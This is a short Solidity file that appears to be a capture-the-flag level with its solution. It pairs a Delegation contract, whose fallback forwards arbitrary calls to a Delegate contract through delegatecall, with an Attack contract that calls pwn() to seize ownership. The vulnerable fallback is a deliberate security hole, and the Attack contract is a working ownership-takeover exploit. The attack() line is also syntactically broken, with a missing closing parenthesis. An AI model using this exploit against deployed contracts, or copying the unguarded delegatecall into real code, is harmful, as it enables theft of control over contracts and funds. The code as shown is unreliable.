// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Attack{
    address public Delegation;

    constructor (address _delegation) {
        Delegation = _delegation;
    }

    function attack() public {
        Delegation.call(abi.encodeWithSignature("pwn()");
    }
}

